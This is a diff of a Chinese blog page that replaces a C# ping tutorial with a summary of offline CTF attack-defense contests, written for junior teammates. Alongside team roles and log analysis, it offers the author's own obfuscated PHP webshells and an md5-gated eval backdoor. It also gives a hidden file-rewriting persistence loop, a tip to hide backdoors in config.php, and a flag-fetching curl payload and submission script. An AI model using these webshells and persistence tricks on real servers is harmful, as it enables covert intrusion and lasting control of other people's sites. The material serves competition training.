@@ -89,7 +89,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
 
 
-  <meta name="keywords" content="tools,C#,">
+  <meta name="keywords" content="CTF,Writeup,">
 
 
 
@@ -107,24 +107,22 @@
 
 
 
-<meta name="description" content="利用周末，造个轮子，学习C#！！">
-<meta name="keywords" content="tools,C#">
+<meta name="description" content="本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。">
+<meta name="keywords" content="CTF,Writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="C段ping操作（C#入门）">
-<meta property="og:url" content="http://rcoil.me/2018/04/C段ping操作/index.html">
+<meta property="og:title" content="CTF线下攻防赛总结">
+<meta property="og:url" content="http://rcoil.me/2017/06/CTF线下赛总结/index.html">
 <meta property="og:site_name" content="RcoIl的窝">
-<meta property="og:description" content="利用周末，造个轮子，学习C#！！">
+<meta property="og:description" content="本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://rcoil.me/image/C段ping操作/examples.png">
-<meta property="og:image" content="http://rcoil.me/image/C段ping操作/hostname.png">
-<meta property="og:image" content="http://rcoil.me/image/C段ping操作/regex-1.png">
-<meta property="og:image" content="http://rcoil.me/image/C段ping操作/regex.png">
-<meta property="og:image" content="http://rcoil.me/image/C段ping操作/demo.png">
-<meta property="og:updated_time" content="2018-04-24T13:07:56.961Z">
+<meta property="og:image" content="http://rcoil.me/image/CTF线下攻防赛/CTF线下攻防赛.png">
+<meta property="og:image" content="http://rcoil.me/image/CTF线下攻防赛/5942aa87d34c8.png">
+<meta property="og:image" content="http://rcoil.me/image/CTF线下攻防赛/blog_2018-11-16_10-29-59.png">
+<meta property="og:updated_time" content="2018-11-17T12:14:17.610Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="C段ping操作（C#入门）">
-<meta name="twitter:description" content="利用周末，造个轮子，学习C#！！">
-<meta name="twitter:image" content="http://rcoil.me/image/C段ping操作/examples.png">
+<meta name="twitter:title" content="CTF线下攻防赛总结">
+<meta name="twitter:description" content="本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。">
+<meta name="twitter:image" content="http://rcoil.me/image/CTF线下攻防赛/CTF线下攻防赛.png">
 
 
 
@@ -152,13 +150,13 @@
 
 
 
-  <link rel="canonical" href="http://rcoil.me/2018/04/C段ping操作/">
+  <link rel="canonical" href="http://rcoil.me/2017/06/CTF线下赛总结/">
 
 
 
 
 
-  <title> C段ping操作（C#入门） | RcoIl的窝 </title>
+  <title> CTF线下攻防赛总结 | RcoIl的窝 </title>
 </head>
 
 <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -339,7 +337,7 @@
   
 
   <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://rcoil.me/2018/04/C段ping操作/">
+    <link itemprop="mainEntityOfPage" href="http://rcoil.me/2017/06/CTF线下赛总结/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="RcoIl">
@@ -360,7 +358,7 @@
             
             
               
-                C段ping操作（C#入门）
+                CTF线下攻防赛总结
               
             
           </h1>
@@ -375,8 +373,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-14T14:37:56+08:00">
-                2018-04-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-23T21:29:11+08:00">
+                2017-06-23
               </time>
             
 
@@ -398,8 +396,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/编程之道/" itemprop="url" rel="index">
-                    <span itemprop="name">编程之道</span>
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -415,7 +413,7 @@
 
           
           
-             <span id="/2018/04/C段ping操作/" class="leancloud_visitors" data-flag-title="C段ping操作（C#入门）">
+             <span id="/2017/06/CTF线下赛总结/" class="leancloud_visitors" data-flag-title="CTF线下攻防赛总结">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                 <!--
@@ -448,27 +446,47 @@
       
 
       
-        <p>利用周末，造个轮子，学习C#！！</p>
-<a id="more"></a>
-<h2 id="官方examples"><a href="#官方examples" class="headerlink" title="官方examples"></a>官方examples</h2><p>查看官方的Ping类，已经很成熟了。以下为官方<code>examples</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void Main (string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Ping pingSender = new Ping ();</span><br><span class="line">            PingOptions options = new PingOptions ();</span><br><span class="line"></span><br><span class="line">            // Use the default Ttl value which is 128,</span><br><span class="line">            // but change the fragmentation behavior.</span><br><span class="line">            options.DontFragment = true;</span><br><span class="line"></span><br><span class="line">            // Create a buffer of 32 bytes of data to be transmitted.</span><br><span class="line">            string data = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class="line">            byte[] buffer = Encoding.ASCII.GetBytes (data);</span><br><span class="line">            int timeout = 120;</span><br><span class="line">            PingReply reply = pingSender.Send (args[0], timeout, buffer, options);</span><br><span class="line">            if (reply.Status == IPStatus.Success)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ());</span><br><span class="line">                Console.WriteLine (&quot;RoundTrip time: &#123;0&#125;&quot;, reply.RoundtripTime);</span><br><span class="line">                Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl);</span><br><span class="line">                Console.WriteLine (&quot;Don&apos;t fragment: &#123;0&#125;&quot;, reply.Options.DontFragment);</span><br><span class="line">                Console.WriteLine (&quot;Buffer size: &#123;0&#125;&quot;, reply.Buffer.Length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<p><img src="/image/C段ping操作/examples.png" alt=""></p>
-<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><h3 id="数据显示"><a href="#数据显示" class="headerlink" title="数据显示"></a>数据显示</h3><p>官方demo中使用的是默认的<code>Ttl</code>（128），那接下来也使用这个默认值。对demo进行修改，显示所需要的信息即可。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ());</span><br><span class="line">Console.WriteLine (&quot;HostName: &#123;0&#125;&quot;, Dns.GetHostEntry(reply.Address.ToString()).HostName);</span><br><span class="line">Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl);</span><br></pre></td></tr></table></figure>
-<p>这只能识别windows系统的，毕竟是128。emmm。</p>
-<p><img src="/image/C段ping操作/hostname.png" alt=""></p>
-<h3 id="正则匹配IP"><a href="#正则匹配IP" class="headerlink" title="正则匹配IP"></a>正则匹配IP</h3><p>使用正则去匹配输入的IP地址是否合理。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// IP地址</span><br><span class="line">Regex regex = new Regex(@&quot;\d+\.\d+\.\d+\.\d+&quot;);// (提取IP地址时有用)</span><br><span class="line">// IP地址</span><br><span class="line">Regex regex = new Regex(@&quot;((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))&quot;);</span><br><span class="line">// IP地址</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-<p>调用处理：</p>
-<p><img src="/image/C段ping操作/regex-1.png" alt=""></p>
-<p>效果：</p>
-<p><img src="/image/C段ping操作/regex.png" alt=""></p>
-<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>流程：输入–&gt; 判断IP格式（处理）–&gt;遍历（ToString）–&gt;Ping()–&gt;输出–&gt;结束</p>
-<p><img src="/image/C段ping操作/demo.png" alt=""></p>
-<p>项目地址：<a href="https://github.com/RcoIl/cping" target="_blank" rel="noopener"><i class="fab fa-github" icon-2x=""></i></a></p>
-<p>【参考】</p>
-<p><a href="https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx</a></p>
+        <p>本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。<br><a id="more"></a></p>
+<hr>
+<p>一张常规的CTF线下攻防思维导图<br><img src="/image/CTF线下攻防赛/CTF线下攻防赛.png" alt="CTF线下攻防思维导图"></p>
+<h2 id="SSH登陆"><a href="#SSH登陆" class="headerlink" title="SSH登陆"></a>SSH登陆</h2><p>两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。</p>
+<p>tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如<code>bak</code>。<br>依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个<code>bak</code>目录，打开发现是<code>phpmyadmin</code>，提示的弱口令是在这里用上。</p>
+<h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p>首先先理清好网络拓扑关系，节点与各链路之间的关联。这个需要下一步配合，要不然不知道对手在哪就GG。<br>示例：<br><img src="/image/CTF线下攻防赛/5942aa87d34c8.png" alt="区二赛网络拓扑图"></p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>如果是在同个C段，或者B段，均可以使用<code>RouterScan</code>进行对80端口扫描进行扫描得出，嫌麻烦的话，就用<a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">httpscan</a>这个小巧的脚本</p>
+<p>千万要记得扫端口，这很重要。用nmap也行，自己写的脚本或者网上找的也行。</p>
+<h2 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h2><p>有的比赛环境，为了照顾比较菜的选手（此处举手），预留了一句话后门。将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留）</p>
+<h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p><img src="/image/CTF线下攻防赛/blog_2018-11-16_10-29-59.png" alt="线下赛黑盒测试"></p>
+<p>防御及修复建议<br>1.将所有的登陆口密码进行修改（炒鸡复杂）；<br>2.将上传页面的action地址修改为<code>*</code>，（机智小能手！！）；<br>3.反序列化和命令执行，就去seebug或其他的站点找补丁；<br>4.待补充…</p>
+<h2 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h2><p>控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。<br>简单举例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>连接方式：php?2=assert密码是1。<br>献上我常用得一句话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=chr(<span class="number">96</span>^<span class="number">5</span>);</span><br><span class="line">$b=chr(<span class="number">57</span>^<span class="number">79</span>);</span><br><span class="line">$c=chr(<span class="number">15</span>^<span class="number">110</span>);</span><br><span class="line">$d=chr(<span class="number">58</span>^<span class="number">86</span>);</span><br><span class="line">$e=<span class="string">'($_REQUEST[C])'</span>;</span><br><span class="line">@assert($a.$b.$c.$d.$e);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>配置为<code>?b=))99(rhC(tseuqeR+lave</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>配置填<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code><br>连接密码:0（零）</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	$file = <span class="string">'.demo.php'</span>;</span><br><span class="line">	$shell = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>tips:<code>.demo.php</code>前面使用一个点，能很好的隐藏文件。<br>想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	$pid=<span class="number">1234</span>;</span><br><span class="line">	@unlink(<span class="string">'demo.php'</span>);</span><br><span class="line">	exec(<span class="string">'kill -9 $pid'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>先查看进程，查看对应的pid，再执行即可。</p>
+<p>素质低的人则会放置一个md5马，比如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>如果素质低的人又很猥琐，像<a href="http://blog.163.com/passw0a_d/blog/static/2508070612017613113859691/" target="_blank" rel="noopener">rootrain</a>这种就是。那就是利用<code>header</code>，最后综合起来就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</span><br><span class="line">$test= <span class="string">'flag'</span>;</span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</span><br><span class="line">    header(<span class="string">"flag:$test"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>放进<code>config.php</code>效果最好，因为一般很少人去看这个。</p>
+<h2 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h2><p>上面的<code>$shell</code>内容看个人，线下赛可以直接使用<code>&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;</code>之类的，只是说一个点，剩余的发挥空间由你们思考。</p>
+<p>最好能写一个批量上传的，结合批量访问。批量访问参考<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/">PHP-定时任务</a><br>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	flag=$(curl <span class="string">'http://172.16.4.42:800'</span>)</span><br><span class="line">	curl --cookie <span class="string">"PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD"</span> --data <span class="string">"key="</span><span class="variable">$&#123;flag&#125;</span> <span class="string">"http://172.16.4.42/index.php/wargame/submit"</span></span><br><span class="line">	sleep 1s</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
+<p>只有想不到，没有做不到。</p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="日志分析的用途"><a href="#日志分析的用途" class="headerlink" title="日志分析的用途"></a>日志分析的用途</h3><ol>
+<li>感知可能正在发生的攻击，从而规避存在的安全风险</li>
+<li>应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失</li>
+</ol>
+<h3 id="记录log脚本"><a href="#记录log脚本" class="headerlink" title="记录log脚本"></a>记录log脚本</h3><p>这种脚本网上有很多。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</span><br><span class="line">$ip       = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//记录访问者的ip</span></span><br><span class="line">$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];	<span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter   = $_SERVER[<span class="string">"QUERY_STRING"</span>]; <span class="comment">//访问者要请求的参数</span></span><br><span class="line">$time     =   date(<span class="string">'Y-m-d H:i:s'</span>,time()); <span class="comment">//访问时间</span></span><br><span class="line">$logadd = <span class="string">'来访时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：'</span>.<span class="string">'http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line">$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h3><ol>
+<li>LogForensics 腾讯实验室<br><a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">https://security.tencent.com/index.php/opensource/detail/15</a></li>
+<li>北风飘然@金乌网络安全实验室<br><a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/126698.html</a></li>
+<li>网络ID为piaox的安全从业人员：<br><a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/110644.html</a></li>
+<li>网络ID：SecSky<br><a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/8982.html</a></li>
+<li>网络ID：鬼魅羊羔<br><a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/96675.html</a></li>
+</ol>
+<h2 id="CTF总结"><a href="#CTF总结" class="headerlink" title="CTF总结"></a>CTF总结</h2><h3 id="意义所在"><a href="#意义所在" class="headerlink" title="意义所在"></a>意义所在</h3><p>首先，CTF题是信息安全得基本概念，攻防技术、技巧得浓缩和提炼。通过解题，会快速掌握题目中所包含得概念和技术点，而这些知识在真实得环境中可能比较分散，难以学习，高水平得CTF都是由业内专家命题，往往凝聚着他们多年积累出来的技能。</p>
+<p>其次，CTF题注重实际操作，并与基础理论知识相结合。每道CTF都需要实际动手才能找到答案，并且在比赛中经常要拼速度，这对攻防操作得能力会有极高的锻炼。除此之外，高质量得CTF题都没法直接使用现成工具解出，一般需要在理解基本原理的基础上，自己编写代码来求解，这个过程会加深和巩固计算机基础知识得理解。</p>
+<p>最后，CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；有初步基础的学生，通过高质量赛题的实践练习，提升了实战能力；已经学有所成的学生，通过国际CTF大赛和国际强队比拼，开阔了视野。</p>
+<h3 id="不要为CTF而CTF"><a href="#不要为CTF而CTF" class="headerlink" title="不要为CTF而CTF"></a>不要为CTF而CTF</h3><p>虽然ctf涉及到的知识点面非常的全面。但是在实际应用中，在自己所选择的方向上给予不了多大的帮助。<br>只因为CTF环境太过于理想化（当然是我水平问题，做不来大的CTF赛题），因为总有方法可以拿到flag，在实操上，遇到瓶颈，要考虑的东西就多了。</p>
 
       
     </div>
@@ -513,7 +531,7 @@
     </li>
     <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://rcoil.me/2018/04/C段ping操作/" title="C段ping操作（C#入门）">http://rcoil.me/2018/04/C段ping操作/</a>
+      <a href="http://rcoil.me/2017/06/CTF线下赛总结/" title="CTF线下攻防赛总结">http://rcoil.me/2017/06/CTF线下赛总结/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明： </strong>
@@ -529,9 +547,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/tools/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> tools</a>
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> CTF</a>
           
-            <a href="/tags/C/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> C#</a>
+            <a href="/tags/Writeup/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> Writeup</a>
           
         </div>
       
@@ -544,8 +562,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/Cobalt Strike学习/" rel="next" title="Cobalt Strike上手学习">
-                <i class="fa fa-chevron-left"></i> Cobalt Strike上手学习
+              <a href="/2017/06/渗透测试-之-代理篇/" rel="next" title="渗透测试 之 代理篇">
+                <i class="fa fa-chevron-left"></i> 渗透测试 之 代理篇
               </a>
             
           </div>
@@ -554,8 +572,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/05/ISCC-2018/" rel="prev" title="ISCC-2018">
-                ISCC-2018 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/06/内网渗透/" rel="prev" title="内网渗透（持续更新）">
+                内网渗透（持续更新） <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -765,7 +783,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#官方examples"><span class="nav-number">1.</span> <span class="nav-text">官方examples</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修改"><span class="nav-number">2.</span> <span class="nav-text">修改</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#数据显示"><span class="nav-number">2.1.</span> <span class="nav-text">数据显示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#正则匹配IP"><span class="nav-number">2.2.</span> <span class="nav-text">正则匹配IP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#demo"><span class="nav-number">3.</span> <span class="nav-text">demo</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH登陆"><span class="nav-number">1.</span> <span class="nav-text">SSH登陆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络拓扑"><span class="nav-number">2.</span> <span class="nav-text">网络拓扑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#主机发现"><span class="nav-number">3.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#预留后门"><span class="nav-number">4.</span> <span class="nav-text">预留后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#黑盒测试"><span class="nav-number">5.</span> <span class="nav-text">黑盒测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一句话"><span class="nav-number">6.</span> <span class="nav-text">一句话</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限维持"><span class="nav-number">7.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag获取"><span class="nav-number">8.</span> <span class="nav-text">flag获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志分析"><span class="nav-number">9.</span> <span class="nav-text">日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#日志分析的用途"><span class="nav-number">9.1.</span> <span class="nav-text">日志分析的用途</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#记录log脚本"><span class="nav-number">9.2.</span> <span class="nav-text">记录log脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#日志分析工具"><span class="nav-number">9.3.</span> <span class="nav-text">日志分析工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF总结"><span class="nav-number">10.</span> <span class="nav-text">CTF总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#意义所在"><span class="nav-number">10.1.</span> <span class="nav-text">意义所在</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不要为CTF而CTF"><span class="nav-number">10.2.</span> <span class="nav-text">不要为CTF而CTF</span></a></li></ol></li></ol></div>
             
 
           </div>
